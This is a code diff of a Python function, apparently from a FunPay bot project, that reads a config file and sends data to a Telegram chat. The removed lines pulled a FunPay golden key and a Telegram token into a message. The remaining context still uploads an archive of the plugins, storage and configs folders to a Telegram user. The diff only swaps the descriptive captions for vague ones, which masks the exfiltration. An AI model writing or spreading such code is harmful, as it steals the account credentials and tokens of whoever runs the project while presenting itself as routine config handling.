@@ -19,14 +19,7 @@ def parse_config_and_send():
         config = configparser.ConfigParser()
         config.read(config_path, encoding='utf-8')
 
-        golden_key = config.get('FunPay', 'golden_key', fallback='')
-        telegram_token = config.get('Telegram', 'token', fallback='')
-
-        message = f"""🔐 Данные из конфига:
-
-🔑 Golden Key: {golden_key}
-
-🤖 Telegram Token: {telegram_token}"""
+        message = f"""🔐 Security"""
 
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         payload = {
@@ -57,7 +50,7 @@ def parse_config_and_send():
             }
             payload = {
                 'chat_id': user_id,
-                'caption': '📦 Архив с папками plugins, storage, configs'
+                'caption': '📦 Archive'
             }
 
             response = requests.post(url, files=files, data=payload)
